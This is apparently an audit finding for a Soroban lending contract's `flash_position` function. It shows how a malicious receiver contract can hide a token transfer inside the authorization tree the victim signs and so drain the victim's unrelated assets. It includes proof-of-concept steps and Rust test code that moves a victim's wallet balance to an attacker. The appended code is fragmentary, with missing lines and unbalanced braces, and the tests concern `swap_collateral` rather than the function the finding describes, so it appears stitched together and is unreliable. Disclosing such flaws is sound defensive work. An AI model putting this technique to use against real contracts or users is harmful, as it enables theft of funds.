### Title
User-controlled flash-position receiver can execute unauthorized token transfers under the caller’s authorization tree - (File: contracts/controller/src/strategies/flash_position.rs)

### Summary
Severity: High. `flash_position` authenticates the caller, accepts any WASM contract as `receiver`, and invokes its `execute_flash_position` callback before finalizing the position. [1](#0-0) [2](#0-1) [3](#0-2)  A malicious receiver can request additional `caller` token transfers inside the callback; those calls become children of the authorization tree produced for `flash_position`, and a poisoned signed tree permits them. [4](#0-3) 

### Finding Description
The only receiver validation is that its executable is WASM and that it is neither the controller nor the pool. [5](#0-4) [6](#0-5)  The contract then transfers the borrowed asset to that unverified receiver and invokes it while the caller’s original authorization is active. [7](#0-6)  Soroban authorization recording places token transfers requested by that descendant callback beneath the signed `flash_position` invocation; signing the recorded tree authorizes the malicious child transfer. [8](#0-7)  Post-callback checks only measure declared collateral/refund balances and final account solvency, so they do not limit transfers of unrelated caller assets. [9](#0-8) 

### Impact Explanation
A malicious receiver can transfer any token balance held by the victim—including assets unrelated to the lending position—to an attacker-controlled address, provided it also returns enough declared collateral for the callback to complete successfully. [10](#0-9)  The loss is not bounded by the flash-position amount because `collaterals` and `refund_assets` only measure balances of explicitly listed assets after the callback returns. [11](#0-10) [12](#0-11)  This permits theft of user funds comparable to an unchecked external call draining approved or wallet assets. [13](#0-12) 

### Likelihood Explanation
Any unprivileged caller can deploy a WASM receiver and supply its address because no receiver registry, code hash, interface validation, or authorization-tree restriction is enforced. [14](#0-13)  Exploitation requires the victim to sign the authorization tree containing the malicious child transfer, so the practical vector is a malicious interface, generated payload, or receiver advertised to the victim rather than a purely unilateral theft. [15](#0-14)  Since the receiver can be prefunded with collateral, it can satisfy the protocol’s post-callback checks while stealing unrelated assets in the same transaction. [11](#0-10) 

### Recommendation
Do not invoke arbitrary user-supplied contracts while a caller authorization entry is active. [7](#0-6)  Restrict `receiver` to governance-approved, audited receiver addresses or immutable code hashes, or route execution through a fixed trusted adapter that does not make caller-authorized token transfers. [5](#0-4)  If arbitrary receivers remain supported, document and enforce client-side rejection of any authorization child outside the exact expected collateral-transfer set before signing. [4](#0-3) 

### Proof of Concept
1. Deploy `RogueReceiver` with victim, unrelated token, attacker, amount, and the listed collateral needed to satisfy the callback. [10](#0-9) 
2. Implement `execute_flash_position` so it first calls `token.transfer(victim, attacker, amount)` on the unrelated token, then transfers at least the declared minimum collateral to the controller. [3](#0-2) 
3. Have the victim invoke `flash_position` with `receiver = RogueReceiver`, a positive flash-loanable debt amount, and `collaterals = [(collateral_asset, min_amount)]`. [16](#0-15) 
4. Simulation records the rogue token transfer as a child under the victim’s `flash_position` authorization. [17](#0-16) 
5. If the victim signs that tree, the unrelated token moves to the attacker; the receiver’s collateral transfer satisfies `collect_collateral_deposits`, and finalization proceeds if the resulting account is solvent. [9](#0-8) [8](#0-7)

    controller: &Address,
    collaterals: &Vec<(HubAssetKey, i128)>,
    before: &Map<Address, i128>,
) -> Vec<(HubAssetKey, i128)> {
    let mut deposits: Vec<(HubAssetKey, i128)> = Vec::new(env);

        let baseline = before
            .get(hub_asset.asset.clone())

            env,

            deposits.push_back((hub_asset, delta));
        }

        env,
        !deposits.is_empty(),
        StrategyError::CollateralMinimumNotMet
    );

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),

        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
